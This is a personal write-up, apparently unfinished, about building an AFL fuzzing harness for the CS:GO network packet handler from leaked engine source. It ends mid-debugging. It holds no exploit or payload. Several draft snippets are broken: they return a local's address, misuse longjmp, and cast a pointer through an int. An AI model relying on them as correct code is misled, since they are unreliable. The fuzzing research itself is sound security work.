

# Fuzzing the CSGO packet handler

This is my writeup for fuzzing the counter strike packet handler. This is inspired by this: https://phoenhex.re/2018-08-26/csgo-fuzzing-bsp  but instead of fuzzing BSP map files we are now fuzzing the network packet handler.

Now, the original blog post was done with the QEMU fuzzer. This is quite slow and also we do not really have access to the source code. Instead of trying to patch the binary such that we jump to the packet handler function, we also have this: https://github.com/SwagSoftware/Kisak-Strike . It is the leaked source code which can be compiled to the csgo binary.

We can add a longjmp call to the place where we want to jump to the packet handler function and in addition to this we can now use the __AFL_LOOP macro to use persistent mode in the fuzzing.

I actually already did something similar to this with the BSP file fuzzing, but now we just need to do it with the packet handler.


## Quick code overview

The main socket handling function in the counter strike source code is this function:


{% raw %}
```
void NET_ProcessSocket( int sock, IConnectionlessPacketHandler *handler )
{
	class CAutoNetProcessSocketStartEnd
	{
	public:
		CAutoNetProcessSocketStartEnd( int sock ) : m_sock( sock )
		{
			extern void On_NET_ProcessSocket_Start( int hUDP, int sock );
			On_NET_ProcessSocket_Start( net_sockets[m_sock].hUDP, m_sock );
			NET_WS_PACKET_STAT( sock, g_nSockUDPTotalProcess );
		}
		~CAutoNetProcessSocketStartEnd()
		{
			extern void On_NET_ProcessSocket_End( int hUDP, int sock );
			On_NET_ProcessSocket_End( net_sockets[m_sock].hUDP, m_sock );
		}
	private:
		int m_sock;
	}
	autoThreadSockController( sock );

	netpacket_t * packet;
	
	//Assert ( (sock >= 0) && (sock<net_sockets.Count()) );

	// Scope for the auto_lock
	{
		AUTO_LOCK_FM( s_NetChannels );

		// get streaming data from channel sockets
		int numChannels = s_NetChannels.Count();

		for ( int i = (numChannels-1); i >= 0 ; i-- )
		{
			CNetChan *netchan = s_NetChannels[i];

			// sockets must match
			if ( sock != netchan->GetSocket() )
				continue;

			if ( !netchan->ProcessStream() )
			{
				netchan->GetMsgHandler()->ConnectionCrashed("TCP connection failed.");
			}
		}
	}

	// now get datagrams from sockets
	net_scratchbuffer_t scratch;
	while ( ( packet = NET_GetPacket ( sock, scratch.GetBuffer() ) ) != NULL )
	{
		if ( Filter_ShouldDiscard ( packet->from ) )	// filtering is done by network layer
		{
			Filter_SendBan( packet->from );	// tell them we aren't listening...
			continue;
		} 

		// check for connectionless packet (0xffffffff) first
		if ( LittleLong( *(unsigned int *)packet->data ) == CONNECTIONLESS_HEADER )
		{
			packet->message.ReadLong();	// read the -1

			if ( net_showudp.GetInt() && net_showudp_oob.GetInt() )
			{
				Msg("UDP <- %s: sz=%d OOB '0x%02X' wire=%d\n", ns_address_render( packet->from ).String(), packet->size, packet->data[4], packet->wiresize );
//				for ( int k = 0; k < packet->size; ++ k )
//					Msg( " %02X", packet->data[k] );
//				Msg( "\n" );
//				for ( int k = 0; k < packet->size; ++ k )
//					Msg( "  %c", (packet->data[k] >= 32 && packet->data[k] < 127) ? packet->data[k] : '*' );
//				Msg( "\n" );
			}

			handler->ProcessConnectionlessPacket( packet );
			continue;
		}

		// check for packets from connected clients
		
		CNetChan * netchan = NET_FindNetChannel( sock, packet->from );

		if ( netchan )
		{
			netchan->ProcessPacket( packet, true );
		}
		/* else	// Not an error that may happen during connect or disconnect
		{
			Msg ("Sequenced packet without connection from %s\n" , ns_address_render( packet->from ).String() );
		}*/
	}
}

```
{% endraw %}

this code calls the NET_GetPacket function which gets a packet from the socket:

{% raw %}
```
packet = NET_GetPacket ( sock, scratch.GetBuffer() )
```
{% endraw %}


The NET_GetPacket function is this:

{% raw %}
```
netpacket_t *NET_GetPacket (int sock, byte *scratch )
{
	if ( !net_packets.IsValidIndex( sock ) )
		return NULL;
	
	// Each socket has its own netpacket to allow multithreading
	netpacket_t &inpacket = net_packets[sock];

	NET_AdjustLag();
	NET_DiscardStaleSplitpackets( sock );

	// setup new packet
	inpacket.from.Clear();
	inpacket.received = net_time;
	inpacket.source = sock;	
	inpacket.data = scratch;
	inpacket.size = 0;
	inpacket.wiresize = 0;
	inpacket.pNext = NULL;
	inpacket.message.SetDebugName("inpacket.message");

	// Check loopback first
	if ( !NET_GetLoopPacket( &inpacket ) )
	{
#ifdef PORTAL2
		extern IVEngineClient *engineClient;
		// PORTAL2-specific hack for console perf - don't waste time reading from the actual socket (expensive Steam code)
		if ( !NET_IsMultiplayer() || engineClient->IsSplitScreenActive() 
			|| ( !IsGameConsole() && sv.IsActive() && !sv. IsMultiplayer() ) )
#else // PORTAL2
		if ( !NET_IsMultiplayer() )
#endif // !PORTAL2
		{
			return NULL;
		}

		// then check UDP data 
		if ( !NET_ReceiveDatagram( sock, &inpacket ) )
		{
			// at last check if the lag system has a packet for us
			if ( !NET_LagPacket (false, &inpacket) )
			{
				return NULL;	// we don't have any new packet
			}
		}
	}
	
	Assert ( inpacket.size ); 

#ifdef _DEBUG
	if ( fakenoise.GetInt() > 0 )
	{
		COM_AddNoise( inpacket.data, inpacket.size, fakenoise.GetInt() );
	}
#endif
	
	// prepare bitbuffer for reading packet with new size
	inpacket.message.StartReading( inpacket.data, inpacket.size );

	return &inpacket;
}

```
{% endraw %}

the definition of the inpacket  object is here:

{% raw %}
```

typedef struct netpacket_s
{
	ns_address		from;		// sender address
	int				source;		// received source 
	double			received;	// received time
	unsigned char	*data;		// pointer to raw packet data
	bf_read			message;	// easy bitbuf data access
	int				size;		// size in bytes
	int				wiresize;   // size in bytes before decompression
	bool			stream;		// was send as stream
	struct netpacket_s *pNext;	// for internal use, should be NULL in public
} netpacket_t;

```
{% endraw %}

the definition of ProcessPacket is this:

{% raw %}
```
void CNetChan::ProcessPacket( netpacket_t * packet, bool bHasHeader )
{
	VPROF( "CNetChan::ProcessPacket" );

	Assert( packet );

	bf_read &msg = packet->message;	// handy shortcut

	msg.Seek( 0 );

	if ( remote_address.IsValid() && !packet->from.CompareAdr ( remote_address ) )
	{
		return;
	}
#if defined( NET_PARANOID_DUMPS )
	g_NetParanoid.StartPacket( msg );
#endif
	// Update data flow stats
	FlowUpdate( FLOW_INCOMING, packet->wiresize + UDP_HEADER_SIZE );

	int flags = 0;

	if ( bHasHeader	)
	{
		flags = ProcessPacketHeader( packet );
	}

	if ( flags == -1 )
		return; // invalid header/packet
#if defined( NET_PARANOID_DUMPS )
	g_NetParanoid.NoteHeaderSize( msg, flags );
#endif
	if ( net_showudp.GetInt() && net_showudp.GetInt() != 3 &&
		( !net_showudp_remoteonly.GetBool() || !( remote_address.IsLocalhost() || remote_address.IsLoopback() ) ) )
	{
		char desc[ 128 ];
		uint64 steamID = g_pSteamSocketMgr->GetSteamIDForRemote( remote_address );
		Color clr( 0, 200, 255, 255 );
		if ( steamID != 0ull )
		{
			clr = Color( 255, 255, 100, 255 );
			Q_snprintf( desc, sizeof( desc ), "%12.12s %21.21s s(%llx)", GetName(), GetAddress(), steamID );
		}
		else
		{
			Q_snprintf( desc, sizeof( desc ), "%12.12s %21.21s", GetName(), GetAddress() );
		}
		ConColorMsg( clr, "UDP <- %s: sz=%5i seq=%5i ack=%5i rel=%1i tm=%8.3f wire=%i\n"
			, desc
			, packet->size
			, m_nInSequenceNr & 63
			, m_nOutSequenceNrAck & 63 
			, flags & PACKET_FLAG_RELIABLE ? 1 : 0
			, net_time
			, packet->wiresize );
	}
	
	last_received = net_time;

// tell message handler that a new packet has arrived
	m_MessageHandler->PacketStart( m_nInSequenceNr, m_nOutSequenceNrAck );

	if ( flags & PACKET_FLAG_RELIABLE )
	{
		int i, bit = 1<<msg.ReadUBitLong( 3 );

		for ( i=0; i<MAX_STREAMS; i++ )
		{
			if ( msg.ReadOneBit() != 0 )
			{
				if ( !ReadSubChannelData( msg, i ) )
					return; // error while reading fragments, drop whole packet
			}
		}

		// flip subChannel bit to signal successfull receiving
		FLIPBIT(m_nInReliableState, bit);
		
		for ( i=0; i<MAX_STREAMS; i++ )
		{
			if ( !CheckReceivingList( i ) )
				return; // error while processing 
		}
	}

// Is there anything left to process?
	if ( msg.GetNumBitsLeft() > 0 )
	{
		// parse and handle all messeges 
		if ( !ProcessMessages( msg, false ) )
		{
			return;	// disconnect or error
		}
	}
	
// tell message handler that packet is completely parsed
	m_MessageHandler->PacketEnd();

#if !defined(DEDICATED)
// tell demo system that packet is completely parsed
	if ( m_DemoRecorder && !demoplayer->IsPlayingBack() )
	{
		m_DemoRecorder->RecordPacket();
	}
#endif
}
```
{% endraw %}





and then finally ProcessMessages which calls _ProcessMessages internally:

{% raw %}
```
bool CNetChan::ProcessMessages( bf_read &buf, bool wasReliable  )
{
	MDLCACHE_CRITICAL_SECTION( );

	// For split screen support
	m_pActiveChannel = this;
	return _ProcessMessages( buf, wasReliable );
	// Can't safely put code here because delete this could have occurred!!!
}
```
{% endraw %}

one thing to note about this code is that wiresize isn't really used in the _ProcessMessages function so we really do not need to modify it accordingly and I think that we can safely ignore this field in the packet object.


## Plan of attack

So maybe the easiest way to accomplish this is to just do something similar with the bsp file thing, except that this time we should probably use the longjmp thing to jump instead of making a script which patches the compiled binary like I did previously.

This is what I did previously:


{% raw %}
```
#include <bits/stdc++.h>

#include <dlfcn.h>
#include <link.h>
#include <unistd.h>
#include <fcntl.h>

#ifndef __AFL_FUZZ_TESTCASE_LEN
  ssize_t fuzz_len;
  #define __AFL_FUZZ_TESTCASE_LEN fuzz_len
  unsigned char fuzz_buf[1024000];
  #define __AFL_FUZZ_TESTCASE_BUF fuzz_buf
  #define __AFL_FUZZ_INIT() void sync(void);
  #define __AFL_LOOP(x) ((fuzz_len = read(0, fuzz_buf, sizeof(fuzz_buf))) > 0 ? 1 : 0)
  #define __AFL_INIT() sync()
#endif

using namespace std;

// dedicated
void (*DedicatedMain)(int argc, const char** argv);

// engine
void (*CModelLoader_GetModelForName)(void*, const char* name, int referencetype);
void (*CModelLoader_Print)(void*);
// void CModelLoader::UnloadAllModels( bool bCheckReference )
void (*CModelLoader_UnloadAllModels)(void*, bool bCheckReference );
void** p_modelloader;

template <typename T> void ptr(T*& f, void* so, uint32_t offset) {
    f = (T*)((char*)so + offset);
}

void forkserver() {
    return;
}

bool dbg;
char *mappath;
char *argvtwo;
__AFL_FUZZ_INIT();

/*
ssize_t read_bytes;
    unsigned char *buf;
    size_t count;
    FILE *filepointer;
    FILE *anotherfilepointer;
    int result;
    ssize_t len;

*/
void startpointoof() {
    //fprintf(stderr, "startpoint()\n");
    ssize_t len;
    unsigned char *buf;
    void* modelloader = *p_modelloader;
    
    ssize_t read_bytes;
    
    size_t count;
    FILE *filepointer;
    
    int result;
    char filewritestring[100] = "./csgo/maps/";
    char anotherstring[100] = "maps/";
    



    __AFL_INIT();

    buf = __AFL_FUZZ_TESTCASE_BUF;
    printf("%s", "Entering the loop bullshit....\n");
    strcat(filewritestring,argvtwo);
    strcat(anotherstring,argvtwo);
    while (__AFL_LOOP(1000)) {
        printf("%s", "Starting the loop.\n");
        len = __AFL_FUZZ_TESTCASE_LEN;
        filepointer = fopen(filewritestring, "wb");
        if (filepointer == NULL) {
            printf("%s", "Could not load model file.\n");
            return;
        }
        printf("%s", "Waiting for user input:\n");
        fwrite(buf, len, 1, filepointer);
        fclose(filepointer);
        printf("%s", "Got user input from terminal. Time to try to load the thing:\n");
        //_exit(1);
        CModelLoader_GetModelForName(modelloader, anotherstring, 2);
        // print the Models:

        CModelLoader_Print(modelloader); // does not take any arguments. Just takes the models from memory.
        CModelLoader_UnloadAllModels(modelloader, false); // unload all models
        //CModelLoader_GetModelForName(modelloader, "maps/oof.bsp", 2);
        printf("%s", "Returned from the GetModelForName function.\n");

    }

    //CModelLoader_GetModelForName(modelloader, mappath, 2);
    


    cout << "Done" << endl;

    _exit(0);
}

int main(int argc, char** argv) {
    int     *iptr, (*fptr)(int, const char**);
    if (argc < 2) {
        cerr << "Usage: " << argv[0] << " bspfile [--dbg]" << endl;
        return EXIT_FAILURE;
    }

    dbg = argc > 2 && string(argv[2]) == "--dbg";
    if (dbg) {
        cerr << "Debug mode enabled" << endl;
    }

    struct link_map *lm = (struct link_map*)dlopen("dedicated_client.so", RTLD_NOW);
    *(void **)(&fptr) = dlsym( lm, "DedicatedMain" );

    if(lm == NULL){

        fprintf(stderr, dlerror());

    }
    //*(void **)(&fptr) = dlsym(lm, "DedicatedMain");
    void* dedicated = (void*)lm->l_addr;
    assert(dedicated);
    lm = (struct link_map*)dlopen("engine_client.so", RTLD_NOW);
    if(lm == NULL){

        fprintf(stderr, dlerror());

    }
    void* engine = (void*)lm->l_addr;
    assert(engine);

    cout << "dedicated.so loaded at " << dedicated << endl;
    cout << "engine.so loaded at " << engine << endl;

    mappath = argv[1];
    if (mappath[0] != '/') {
        char tmp[2048];
        getcwd(tmp, sizeof tmp);
        strcat(tmp, "/");
        strcat(tmp, mappath);
        mappath = strdup(tmp);
    }
    argvtwo = argv[2];
    cout << "Reading from " << mappath << endl;
    void *vstdlib = dlopen( "libvstdlib_client.so", RTLD_NOW );
    if ( !vstdlib )
    {
        printf( "Failed to open %s (%s)\n", "libvstdlib_client.so", dlerror());
        return -1;
    }
    // dedicated
    // ORIGINAL:
    //ptr(DedicatedMain, dedicated, 0x1beb0);
    //ptr(DedicatedMain, dedicated, 0x00124c30-0x100000);
    //DedicatedMain = dlsym(dedicated, "DedicatedMain");
    
    // engine
    // ORIGINAL
    //ptr(CModelLoader_GetModelForName, engine, 0x180460);
    //ptr(CModelLoader_GetModelForName, engine, 0xa598b0-0x100000); // NEW
    void *tier0 = dlopen( "libtier0_client.so", RTLD_NOW );
    // 000000000052f300 t _ZN12CModelLoader15GetModelForNameEPKcN12IModelLoader13REFERENCETYPEE
    //ptr(CModelLoader_GetModelForName, engine, 0x52f230);
    ptr(CModelLoader_GetModelForName, engine, 0x52f300);



    //ptr(p_modelloader, engine, 0x6E3C80); original line
    //ptr(p_modelloader, engine, 0x213c7e8-0x100000);

    ptr(p_modelloader, engine, 0x138e968);
    ptr(CModelLoader_Print, engine, 0x50c8e0);
    ptr(CModelLoader_UnloadAllModels, engine, 0x5255a0); 


    //void *launcher = dlopen( "bin/linux64/launcher_client.so", RTLD_NOW );
    //void *dedicatedmain = dlopen( "bin/linux64/dedicated_client.so", RTLD_NOW );
    /*
    if ( !launcher )
    {
        //lwss - add dll path in error
        printf( "Failed to load the launcher(%s) (%s)\n", "bin/linux64/launcher_client.so", dlerror() );
        //lwss end
        while(1);
        return 0;
    }
    */
    
    


    const char* args[] = {"x", "-game", "csgo", "-nominidumps", "-nobreakpad", "-port", argv[3], "-console", "+map", "de_dust2"};
    //DedicatedMain(sizeof args / sizeof *args, args);
    (*fptr)(sizeof args / sizeof *args, args);
}

```
{% endraw %}

and then I just compiled this and ran it with the game shared libraries and it worked decently.

Now, instead of doing that I think that I should modify the original source to use longjmp instead. The thing is that I know absolute jack shit about this so this will probably take a long time until I get this right.

The original main.cpp in the dedicated_main thing is this:


{% raw %}
```
#include <stdio.h>
#ifdef _WIN32
#include <windows.h>
#include <assert.h>
#include <direct.h>
#elif POSIX
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#define MAX_PATH PATH_MAX
#endif

#include "tier0/basetypes.h"

#ifdef _WIN32
typedef int (*DedicatedMain_t)( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
							  LPSTR lpCmdLine, int nCmdShow );
#elif POSIX
typedef int (*DedicatedMain_t)( int argc, char *argv[] );

#endif

//-----------------------------------------------------------------------------
// Purpose: Return the directory where this .exe is running from
// Output : char
//-----------------------------------------------------------------------------

static char *GetBaseDir( const char *pszBuffer )
{
	static char	basedir[ MAX_PATH ];
	char szBuffer[ MAX_PATH ];
	size_t j;
	char *pBuffer = NULL;

	strcpy( szBuffer, pszBuffer );

	pBuffer = strrchr( szBuffer,'\\' );
	if ( pBuffer )
	{
		*(pBuffer+1) = '\0';
	}

	strcpy( basedir, szBuffer );

	j = strlen( basedir );
	if (j > 0)
	{
		if ( ( basedir[ j-1 ] == '\\' ) || 
			 ( basedir[ j-1 ] == '/' ) )
		{
			basedir[ j-1 ] = 0;
		}
	}

	return basedir;
}

#ifdef _WIN32
int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	// Must add 'bin' to the path....
	char* pPath = getenv("PATH");

	// Use the .EXE name to determine the root directory
	char moduleName[ MAX_PATH ];
	char szBuffer[ 4096 ];
	if ( !GetModuleFileName( hInstance, moduleName, MAX_PATH ) )
	{
		MessageBox( 0, "Failed calling GetModuleFileName", "Launcher Error", MB_OK );
		return 0;
	}

	// Get the root directory the .exe is in
	char* pRootDir = GetBaseDir( moduleName );

#ifdef _DEBUG
	int len = 
#endif
	_snprintf( szBuffer, sizeof( szBuffer ) - 1, "PATH=%s\\bin\\;%s", pRootDir, pPath );
	szBuffer[ sizeof(szBuffer) - 1 ] = 0;
	assert( len < 4096 );
	_putenv( szBuffer );

	HINSTANCE launcher = LoadLibrary( "bin\\dedicated" DLL_EXT_STRING ); // STEAM OK ... filesystem not mounted yet
	if (!launcher)
	{
		char *pszError;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&pszError, 0, NULL);

		char szBuf[1024];
		_snprintf(szBuf, sizeof( szBuf ) - 1, "Failed to load the launcher DLL:\n\n%s", pszError);
		szBuf[ sizeof(szBuf) - 1 ] = 0;
		MessageBox( 0, szBuf, "Launcher Error", MB_OK );

		LocalFree(pszError);
		return 0;
	}

	DedicatedMain_t main = (DedicatedMain_t)GetProcAddress( launcher, "DedicatedMain" );
	return main( hInstance, hPrevInstance, lpCmdLine, nCmdShow );
}

#elif defined(POSIX)
#define stringize(a) #a
#define dedicated_binary(a,b,c) a stringize(b) c 

int main( int argc, char *argv[] )
{
	// Must add 'bin' to the path....
	char* pPath = getenv("LD_LIBRARY_PATH");
	char szBuffer[4096];
	char cwd[ MAX_PATH ];
	if ( !getcwd( cwd, sizeof(cwd)) )
	{
		printf( "getcwd failed (%s)", strerror(errno));
	}
	
	snprintf( szBuffer, sizeof( szBuffer ) - 1, "LD_LIBRARY_PATH=%s/bin:%s", cwd, pPath );
	printf( "%s\n", szBuffer );
	int ret = putenv( szBuffer );
	if ( ret )	
	{
		printf( "%s\n", strerror(errno) );
	}

	void *tier0 = dlopen( "libtier0" DLL_EXT_STRING, RTLD_NOW );
	if ( !tier0 )
	{
		printf( "Failed to open %s (%s)\n", "libtier0" DLL_EXT_STRING, dlerror());
		return -1;
	}

	void *vstdlib = dlopen( "libvstdlib" DLL_EXT_STRING, RTLD_NOW );
	if ( !vstdlib )
	{
		printf( "Failed to open %s (%s)\n", "libvstdlib" DLL_EXT_STRING, dlerror());
		return -1;
	}

	const char *pBinaryName = "dedicated" DLL_EXT_STRING;

	void *dedicated = dlopen( pBinaryName, RTLD_NOW );
	if ( !dedicated )
	{
		printf( "Failed to open %s (%s)\n", pBinaryName, dlerror());
		return -1;
	}
	DedicatedMain_t main = (DedicatedMain_t)dlsym( dedicated, "DedicatedMain" );
	if ( !main )
	{
		printf( "Failed to find dedicated server entry point (%s)\n", dlerror() );
		return -1;
	}
		
	ret = main( argc,argv );
	dlclose( dedicated );
	dlclose( vstdlib );
	dlclose( tier0 );
}

#endif

```
{% endraw %}

According to this https://www.tutorialspoint.com/c_standard_library/c_function_longjmp.htm we should use the longjmp thing like so:


{% raw %}
```

#include <stdio.h>
#ifdef _WIN32
#include <windows.h>
#include <assert.h>
#include <direct.h>
#elif POSIX
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <setjmp.h>
#define MAX_PATH PATH_MAX
#endif

#include "tier0/basetypes.h"

#ifdef _WIN32
typedef int (*DedicatedMain_t)( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
							  LPSTR lpCmdLine, int nCmdShow );
#elif POSIX
typedef int (*DedicatedMain_t)( int argc, char *argv[] );

#endif

//-----------------------------------------------------------------------------
// Purpose: Return the directory where this .exe is running from
// Output : char
//-----------------------------------------------------------------------------

static char *GetBaseDir( const char *pszBuffer )
{
	static char	basedir[ MAX_PATH ];
	char szBuffer[ MAX_PATH ];
	size_t j;
	char *pBuffer = NULL;

	strcpy( szBuffer, pszBuffer );

	pBuffer = strrchr( szBuffer,'\\' );
	if ( pBuffer )
	{
		*(pBuffer+1) = '\0';
	}

	strcpy( basedir, szBuffer );

	j = strlen( basedir );
	if (j > 0)
	{
		if ( ( basedir[ j-1 ] == '\\' ) || 
			 ( basedir[ j-1 ] == '/' ) )
		{
			basedir[ j-1 ] = 0;
		}
	}

	return basedir;
}

#ifdef _WIN32
int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	// Must add 'bin' to the path....
	char* pPath = getenv("PATH");

	// Use the .EXE name to determine the root directory
	char moduleName[ MAX_PATH ];
	char szBuffer[ 4096 ];
	if ( !GetModuleFileName( hInstance, moduleName, MAX_PATH ) )
	{
		MessageBox( 0, "Failed calling GetModuleFileName", "Launcher Error", MB_OK );
		return 0;
	}

	// Get the root directory the .exe is in
	char* pRootDir = GetBaseDir( moduleName );

#ifdef _DEBUG
	int len = 
#endif
	_snprintf( szBuffer, sizeof( szBuffer ) - 1, "PATH=%s\\bin\\;%s", pRootDir, pPath );
	szBuffer[ sizeof(szBuffer) - 1 ] = 0;
	assert( len < 4096 );
	_putenv( szBuffer );

	HINSTANCE launcher = LoadLibrary( "bin\\dedicated" DLL_EXT_STRING ); // STEAM OK ... filesystem not mounted yet
	if (!launcher)
	{
		char *pszError;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&pszError, 0, NULL);

		char szBuf[1024];
		_snprintf(szBuf, sizeof( szBuf ) - 1, "Failed to load the launcher DLL:\n\n%s", pszError);
		szBuf[ sizeof(szBuf) - 1 ] = 0;
		MessageBox( 0, szBuf, "Launcher Error", MB_OK );

		LocalFree(pszError);
		return 0;
	}

	DedicatedMain_t main = (DedicatedMain_t)GetProcAddress( launcher, "DedicatedMain" );
	return main( hInstance, hPrevInstance, lpCmdLine, nCmdShow );
}

#elif defined(POSIX)
#define stringize(a) #a
#define dedicated_binary(a,b,c) a stringize(b) c 





void fuzzing_function(void* packet_thing) {

	// Here the packet is packet_thing and we basically call ProcessPacket with the Packet .
	// CNetChan::ProcessPacket( netpacket_t * packet, bool bHasHeader )


}



int main( int argc, char *argv[] )
{
	// Must add 'bin' to the path....
	char* pPath = getenv("LD_LIBRARY_PATH");
	char szBuffer[4096];
	char cwd[ MAX_PATH ];
	int return_value_thing = 0;
	if ( !getcwd( cwd, sizeof(cwd)) )
	{
		printf( "getcwd failed (%s)", strerror(errno));
	}
	
	snprintf( szBuffer, sizeof( szBuffer ) - 1, "LD_LIBRARY_PATH=%s/bin:%s", cwd, pPath );
	printf( "%s\n", szBuffer );
	int ret = putenv( szBuffer );
	if ( ret )	
	{
		printf( "%s\n", strerror(errno) );
	}

	void *tier0 = dlopen( "libtier0" DLL_EXT_STRING, RTLD_NOW );
	if ( !tier0 )
	{
		printf( "Failed to open %s (%s)\n", "libtier0" DLL_EXT_STRING, dlerror());
		return -1;
	}

	void *vstdlib = dlopen( "libvstdlib" DLL_EXT_STRING, RTLD_NOW );
	if ( !vstdlib )
	{
		printf( "Failed to open %s (%s)\n", "libvstdlib" DLL_EXT_STRING, dlerror());
		return -1;
	}

	const char *pBinaryName = "dedicated" DLL_EXT_STRING;

	void *dedicated = dlopen( pBinaryName, RTLD_NOW );
	if ( !dedicated )
	{
		printf( "Failed to open %s (%s)\n", pBinaryName, dlerror());
		return -1;
	}
	DedicatedMain_t main = (DedicatedMain_t)dlsym( dedicated, "DedicatedMain" );
	if ( !main )
	{
		printf( "Failed to find dedicated server entry point (%s)\n", dlerror() );
		return -1;
	}
	
	/*

	   val = setjmp( env_buffer );
   
   if( val != 0 ) {
      printf("Returned from a longjmp() with value = %s\n", val);
      exit(0);
   }
   printf("Jump function call\n");
   jmpfunction( env_buffer );
   
   return(0);
	*/


	return_value_thing = setjmp(env_buffer);

	if (return_value_thing != 0) {

		// at this point we basically call the fuzzing function because we have jumped back to this function.

		fuzzing_function(return_value_thing);

		dlclose( dedicated );
		dlclose( vstdlib );
		dlclose( tier0 );

		return 0;



	}

	ret = main( argc,argv );





	dlclose( dedicated );
	dlclose( vstdlib );
	dlclose( tier0 );
}
#endif


```
{% endraw %}



Now, one issue which I am facing is that the ProcessPacket is a function which is associated with a class. Now the thing is that classes are a bit funky, because we need to call the method of the object so we really can not just jump to the function itself.

Maybe this will work? :


First we add this to net_ws.cpp :
{% raw %}
```
#include "../jumpbuf.h"
#include <setjmp.h>
```
{% endraw %}
and then later this:

{% raw %}
```
		CNetChan * netchan = NET_FindNetChannel( sock, packet->from );

		if ( netchan )
		{
			// MODIFIED THING:
			// Just call back to the main function from here and pass this object as a parameter.
			longjmp(env_buffer, this);



			netchan->ProcessPacket( packet, true );
		}
		/* else	// Not an error that may happen during connect or disconnect


```
{% endraw %}

actually I think that we need to do something like this:

{% raw %}
```



void fuzzing_function(CNetChan *channelthing) {

	// Here the packet is packet_thing and we basically call ProcessPacket with the Packet .
	// CNetChan::ProcessPacket( netpacket_t * packet, bool bHasHeader )

	// generate packet similar to how we generate the packet with packet = NET_GetPacket ( sock, scratch.GetBuffer() )

	netpacket_t* fuzzed_packet;

	fuzzed_packet = get_new_packet();

	channelthing->ProcessPacket(fuzzed_packet, true);


	return;



}

```
{% endraw %}


and:

{% raw %}
```
netpacket_t* get_new_packet(void) {

	netpacket_t inpacket;

	inpacket.from.Clear();
	inpacket.received = net_time;
	inpacket.source = 100;	
	inpacket.data = scratch;
	inpacket.size = 0;
	inpacket.wiresize = 0;
	inpacket.pNext = NULL;
	inpacket.message.SetDebugName("inpacket.message");

	inpacket.message.StartReading( inpacket.data, inpacket.size );

	return &inpacket;
	



}

```
{% endraw %}



{% raw %}
```

typedef struct netpacket_s
{
	ns_address		from;		// sender address
	int				source;		// received source 
	double			received;	// received time
	unsigned char	*data;		// pointer to raw packet data
	bf_read			message;	// easy bitbuf data access
	int				size;		// size in bytes
	int				wiresize;   // size in bytes before decompression
	bool			stream;		// was send as stream
	struct netpacket_s *pNext;	// for internal use, should be NULL in public
} netpacket_t;

```
{% endraw %}

To use all of this stuff we need to include the header files:


{% raw %}
```
#include "/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/engine/inetsupport.h"
#include "/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.h"
```
{% endraw %}

Lets try to compile this and see what happens!

And we get a compiler error. Very surprising /s .

{% raw %}
```


In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.h:23,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:26:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/common/netmessages.h:49:10: fatal error: netmessages.pb.h: No such file or directory
   49 | #include "netmessages.pb.h"
      |          ^~~~~~~~~~~~~~~~~~
compilation terminated.



```
{% endraw %}


After literally just removing that include from that thing we now get another error:

{% raw %}
```
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp: In function ‘int main(int, char**)’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:319:20: error: invalid conversion from ‘int’ to ‘INetChannel*’ [-fpermissive]
  319 |   fuzzing_function(return_value_thing);
      |                    ^~~~~~~~~~~~~~~~~~
      |                    |
      |                    int
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicat

```
{% endraw %}

This error was expected because the return type of the setjmp thing when returning with longjmp is an integer and we are trying to cast it to a INetChannel pointer (aka CNetChan pointer) .

Sure, this under normal circumstances would be dumb but now that our application does some unorthodox stuff, we actually need to be able to do this.

While higher level languages are in my opinion better than lower level languages, this is one of the few things lower level stuff is better at: Being able to do close to the metal stuff far easier. Yes, sure the higher level  langauges  protect you from yourself by preventing you from doing dumb shit, but it is at the expense of the understanding of the lower layers. Also the abstraction of course making higher level constructs easier, but the one in a blue moon occurence when you are forced to do "dumb shit" because there is 100% no other way to do it, then you need to come up with complete ugliness like this:

{% raw %}
```
		thing = (INetChannel*)((int*)return_value_thing);
		fuzzing_function(thing);

```
{% endraw %}


And in situations like these, the developer grows uneasy and is more prone to making for example integer casting mistakes which would become obvious when working with assembly language.

Now the program is still compiling but my guess is that we are going to get yelled at by the linker about missing functions ... lets see.

Except lets not see because the compilation seems to take forever. See ya in a few hours.

Ok so after hours of compiling we actually didn't even get any linking errors. Quite surprising. I think that is because the external functions which we are calling are object methods, not plain functions but idk.

Lets see if it actually runs on the first try.

{% raw %}
```
System (VMaterialSystem080) failed during stage CONNECTION
```
{% endraw %}

Uh oh. That does not sound good. Looking through the code we see that the code runs a lot of so called "factories" which add all the required components to the game such as the materialsystem and the filesystem thing and the shader stuff.

after a bit of debugging, I narrowed the problem down to this:


{% raw %}
```
	g_pLauncherMgr = (ILauncherMgr *)factory( "SDLMgrInterface001", NULL );
	if ( !g_pLauncherMgr ) {
		Warning("g_pLauncherMgr == NULL\n");
		return false;
	}

```
{% endraw %}


g_pLauncherMgr is NULL for some reason.


We try to call FindSystem with "SDLMgrInterface001" as pSystemName



{% raw %}
```
void *CAppSystemGroup::FindSystem( const char *pSystemName )
{
	unsigned short i = m_SystemDict.Find( pSystemName );
